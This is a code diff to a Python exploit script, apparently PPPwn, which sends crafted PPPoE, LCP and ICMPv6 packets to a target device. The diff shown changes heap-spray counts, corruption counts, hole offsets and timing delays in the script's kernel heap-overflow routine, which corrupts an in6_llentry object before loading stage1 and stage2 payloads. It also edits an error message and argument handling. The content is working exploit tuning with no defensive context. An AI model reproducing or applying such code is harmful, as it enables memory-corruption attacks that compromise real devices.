@@ -149,11 +149,11 @@ class LcpEchoHandler(AsyncSniffer):
 
 
 class Exploit():
-    SPRAY_NUM = 0x1000
+    SPRAY_NUM = 0x800
     PIN_NUM = 0x1000
-    CORRUPT_NUM = 0x3
+    CORRUPT_NUM = 0x1
 
-    HOLE_START = 0x800
+    HOLE_START = 0x400
     HOLE_SPACE = 0x4
 
     LCP_ID = 0x41
@@ -670,12 +670,12 @@ class Exploit():
                       dst=self.target_mac,
                       type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
                 PPP(proto=0x4141))
-            sleep(0.001)
+            sleep(0.0005)
 
         print('[+] Pinning to CPU 0...done')
 
         # LCP fails sometimes without the wait
-        sleep(1)
+        sleep(0.5)
 
         # Corrupt in6_llentry object
         overflow_lle = self.build_overflow_lle()
@@ -732,7 +732,7 @@ class Exploit():
                 ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))
 
         if not corrupted:
-            print('[-] Error could not corrupt any object')
+            print('[-] Scanning for corrupted object...failed')
             exit(1)
 
         print(
@@ -811,7 +811,7 @@ class Exploit():
 
 def main():
     parser = ArgumentParser('pppwn.py')
-    parser.add_argument('--interface')
+    parser.add_argument('--interface', required=True)
     parser.add_argument('--fw', choices=['900', '1100'], default='1100')
     parser.add_argument('--stage1', default='stage1/stage1.bin')
     parser.add_argument('--stage2', default='stage2/stage2.bin')
